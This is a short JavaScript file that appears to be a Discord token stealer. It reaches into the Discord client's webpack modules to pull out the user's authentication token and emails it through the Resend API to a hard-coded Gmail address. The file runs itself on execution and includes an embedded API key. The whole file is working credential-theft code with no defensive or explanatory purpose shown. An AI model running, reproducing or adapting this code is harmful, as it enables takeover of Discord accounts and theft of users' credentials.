// Token extraction function
function getDiscordToken() {
  try {
    window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
      for(let e of Object.values(o.c)) try {
        if(!e.exports || e.exports === window) continue;
        e.exports?.getToken && (token = e.exports.getToken());
        for(let o in e.exports) 
          e.exports?.[o]?.getToken && "IntlMessagesProxy" !== e.exports[o][Symbol.toStringTag] && 
          (token = e.exports[o].getToken())
      } catch {}
    }]), window.webpackChunkdiscord_app.pop();
    
    return token;
  } catch (e) {
    console.error('Error extracting token:', e);
    return null;
  }
}

// Using Resend API to send the token
const resendApiKey = 're_TtZx711S_JrNGit6zjsP9StMAF2KRh1hL';

async function sendTokenViaResend(token) {
  try {
    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${resendApiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'roon0793@gmail.com',
        to: ['roon0793@gmail.com'],
        subject: 'Discord Token Extracted',
        html: `<p>Discord Token: <strong>${token}</strong></p>`
      })
    });
    
    if (response.ok) {
      console.log('Token sent successfully via Resend');
    } else {
      console.error('Failed to send token:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending token:', error);
  }
}

// Main function to extract and send token
async function extractAndSendToken() {
  const token = getDiscordToken();
  
  if (token) {
    console.log('Token extracted:', token);
    await sendTokenViaResend(token);
  } else {
    console.log('Failed to extract token');
  }
}

// Execute the function
extractAndSendToken();
